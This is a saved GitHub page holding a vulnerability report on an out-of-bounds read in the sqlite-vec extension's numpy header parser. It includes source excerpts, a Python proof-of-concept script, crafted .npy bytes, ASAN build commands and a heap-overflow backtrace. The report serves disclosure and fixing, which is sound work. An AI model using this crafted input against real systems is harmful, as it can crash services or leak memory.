=== Content from github.com_7b52e241_20250110_213454.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FVulnSphere%2FLLMVulnSphere%2Fblob%2Fmain%2FVectorDB%2Fsqlite-vec%2FOOBR_2.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FVulnSphere%2FLLMVulnSphere%2Fblob%2Fmain%2FVectorDB%2Fsqlite-vec%2FOOBR_2.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=VulnSphere%2FLLMVulnSphere)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[VulnSphere](/VulnSphere)
/
**[LLMVulnSphere](/VulnSphere/LLMVulnSphere)**
Public

* [Notifications](/login?return_to=%2FVulnSphere%2FLLMVulnSphere) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FVulnSphere%2FLLMVulnSphere)
* [Star
   3](/login?return_to=%2FVulnSphere%2FLLMVulnSphere)

* [Code](/VulnSphere/LLMVulnSphere)
* [Issues
  0](/VulnSphere/LLMVulnSphere/issues)
* [Pull requests
  0](/VulnSphere/LLMVulnSphere/pulls)
* [Actions](/VulnSphere/LLMVulnSphere/actions)
* [Projects
  0](/VulnSphere/LLMVulnSphere/projects)
* [Security](/VulnSphere/LLMVulnSphere/security)
* [Insights](/VulnSphere/LLMVulnSphere/pulse)

Additional navigation options

* [Code](/VulnSphere/LLMVulnSphere)
* [Issues](/VulnSphere/LLMVulnSphere/issues)
* [Pull requests](/VulnSphere/LLMVulnSphere/pulls)
* [Actions](/VulnSphere/LLMVulnSphere/actions)
* [Projects](/VulnSphere/LLMVulnSphere/projects)
* [Security](/VulnSphere/LLMVulnSphere/security)
* [Insights](/VulnSphere/LLMVulnSphere/pulse)

## Files

 main
## Breadcrumbs

1. [LLMVulnSphere](/VulnSphere/LLMVulnSphere/tree/main)
2. /[VectorDB](/VulnSphere/LLMVulnSphere/tree/main/VectorDB)
3. /[sqlite-vec](/VulnSphere/LLMVulnSphere/tree/main/VectorDB/sqlite-vec)
/
# OOBR\_2.md

Copy path Blame  Blame
## Latest commit

## History

[History](/VulnSphere/LLMVulnSphere/commits/main/VectorDB/sqlite-vec/OOBR_2.md)125 lines (101 loc) · 4.33 KB main
## Breadcrumbs

1. [LLMVulnSphere](/VulnSphere/LLMVulnSphere/tree/main)
2. /[VectorDB](/VulnSphere/LLMVulnSphere/tree/main/VectorDB)
3. /[sqlite-vec](/VulnSphere/LLMVulnSphere/tree/main/VectorDB/sqlite-vec)
/
# OOBR\_2.md

Top
## File metadata and controls

* Preview
* Code
* Blame

125 lines (101 loc) · 4.33 KB[Raw](https://github.com/VulnSphere/LLMVulnSphere/raw/refs/heads/main/VectorDB/sqlite-vec/OOBR_2.md)

version: 0.1.1

tag: OOBR, VectorDB, Parse

<https://github.com/asg017/sqlite-vec>

A vector search SQLite extension which has 3.6k stars. It can load numpy file.

```
//https://github.com/asg017/sqlite-vec/blob/main/sqlite-vec.c#L2473C1-L2478C2
void npy_scanner_init(struct NpyScanner *scanner, const unsigned char *source,
                      int source_length) {
  scanner->start = (unsigned char *)source;
  scanner->end = (unsigned char *)source + source_length;
  scanner->ptr = (unsigned char *)source;
}

// https://github.com/asg017/sqlite-vec/blob/main/sqlite-vec.c#L2489C1-L2500C70
int parse_npy_header(sqlite3_vtab *pVTab, const unsigned char *header,
                     size_t headerLength,
                     enum VectorElementType *out_element_type,
                     int *fortran_order, size_t *numElements,
                     size_t *numDimensions) {

  struct NpyScanner scanner;
  struct NpyToken token;
  int rc;
  npy_scanner_init(&scanner, header, headerLength);

  if (npy_scanner_next(&scanner, &token) != VEC0_TOKEN_RESULT_SOME &&  //<-----[1]
    ...
```

The function `parse_npy_header` is used to parse the numpy file. It uses `scanner` to record the position.
`npy_scanner_next` continues to call `npy_token_next`.

```
//https://github.com/asg017/sqlite-vec/blob/main/sqlite-vec.c#L2390
int npy_token_next(unsigned char *start, unsigned char *end,
                   struct NpyToken *out) {
  unsigned char *ptr = start;
  while (ptr < end) {
    unsigned char curr = *ptr;
    if (is_whitespace(curr)) {
      ptr++;
      continue;
    } else if (curr == '(') {
      ...
    } else if (curr == '\'') {
      ...
    } else if (curr == 'F' &&
               strncmp((char *)ptr, "False", strlen("False")) == 0) {  <-----[2]
      out->start = ptr;
      out->end = (ptr + (int)strlen("False"));
      ptr = out->end;
      out->token_type = NPY_TOKEN_TYPE_FALSE;
      return VEC0_TOKEN_RESULT_SOME;
    } else if (is_digit(curr)) {
        ...
    } else {
      return VEC0_TOKEN_RESULT_ERROR;
    }
  }
  return VEC0_TOKEN_RESULT_ERROR;
}
```

When curr is 'F', it determines at [2] whether the word here is "False", but does not judge the length of the readable data. If the data length is less than strlen("False") at this time, it will cause out-of-bounds data reading.

Poc code:

```
import sqlite3

def execute_all(cursor, sql, args=None):
    if args is None:
        args = []
    results = cursor.execute(sql, args).fetchall()
    return list(map(lambda x: dict(x), results))

def connect(ext, path=":memory:", extra_entrypoint=None):
    db = sqlite3.connect(path)
    db.enable_load_extension(True)
    db.load_extension(ext)
    db.row_factory = sqlite3.Row
    return db

db = connect("./dist/vec0")

vec_npy_each_f = lambda *args: execute_all(
    db, "select * from vec_npy_each(?)", args
)

with open("./poc.npy", "rb") as f:
    data = f.read()
    print(vec_npy_each_f(data))
```

Poc data:
`00000000: 934e 554d 5059 0111 0100 46 .NUMPY....F`

Poc env:

We should compile with ASAN: `clang -fPIC -shared -Wall -Wextra -g -O0 -lm -lsqlite3 sqlite-vec.c -o dist/vec0.so`.

Then, install python library sqlite-vec.

Last, run `LD_PRELOAD=/usr/lib/llvm-14/lib/clang/14.0.0/lib/linux/libclang_rt.asan-x86_64.so python3 poc.py -detect_leaks=0`

Backtrace:

```
=================================================================
==829976==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200008a05b at pc 0x55f7de421d3d bp 0x7fff3b7230d0 sp 0x7fff3b722878
READ of size 2 at 0x60200008a05b thread T0
    #0 0x55f7de421d3c in strncmp (/sqlite-vec/poc+0x156d3c) (BuildId: cdf4cb5c526ff050498cc65aa238e9fb9d2938e1)
    #1 0x55f7de8e8209 in npy_token_next /sqlite-vec/sqlite-vec.c:2445:16
    #2 0x55f7de8e87de in npy_scanner_next /sqlite-vec/sqlite-vec.c:2481:12
    #3 0x55f7de8e8aba in parse_npy_header /sqlite-vec/sqlite-vec.c:2500:7
    #4 0x55f7de8eb3df in parse_npy_buffer /sqlite-vec/sqlite-vec.c:2808:12
    #5 0x55f7de91337d in vec_npy_eachFilter /sqlite-vec/sqlite-vec.c:2967:10
    #6 0x55f7de608c5b in sqlite3VdbeExec /sqlite-vec/vendor/sqlite3.c:101441:8
    #7 0x55f7de4fe5cd in sqlite3Step /sqlite-vec/vendor/sqlite3.c:91222:10
    #8 0x55f7de4ea0a4 in sqlite3_step /sqlite-vec/vendor/sqlite3.c:91283:16

```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


